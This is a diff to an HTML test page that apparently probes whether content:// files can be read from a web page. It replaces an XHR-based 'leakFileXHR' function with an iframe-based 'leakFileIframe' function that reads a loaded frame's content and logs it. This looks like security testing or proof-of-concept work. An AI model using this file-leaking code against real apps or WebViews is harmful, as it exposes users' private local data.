@@ -3,24 +3,28 @@
 <head>
     <title>Test XMLHttpRequest with content://</title>
     <script type="text/javascript">
-        function leakFileXHR(url) {
-            const xhr = new XMLHttpRequest();
-            xhr.open('GET', url, true);
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState === 4) {
-                    const resultElement = document.getElementById('result');
-                    if (xhr.status === 200) {
-                        resultElement.innerHTML = "<p>File Content:\n" + xhr.responseText + "</p>";
-                    } else {
-                        resultElement.innerHTML = "<p>Failed to load file: " + xhr.status + "</p>";
-                    }
-                }
-            };
-            xhr.onerror = function() {
-                const resultElement = document.getElementById('result');
-                resultElement.innerHTML = "<p>Error occurred while loading the file.</p>";
-            };
-            xhr.send();
+     function leakFileIframe(url) {
+          const iframe = document.createElement('iframe');
+          iframe.onload = () => {
+            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+            if (!iframeDoc) return;
+            const contentType = iframeDoc.contentType;
+            const data = iframeDoc.documentElement.innerHTML;
+            const blob = new Blob([data], { type: contentType });
+            const reader = new FileReader();
+            const contentPromise = new Promise((resolve, reject) => {
+              reader.onload = () => resolve(reader.result);
+              reader.onerror = reject;
+              reader.readAsText(blob);
+            });
+            contentPromise.then(content => {
+              if (content && !content.includes("net::ERR_")) {
+                console.log(content);
+              }
+            });
+          };
+          document.body.appendChild(iframe);
+          iframe.src = url;
         }
     </script>
 </head>
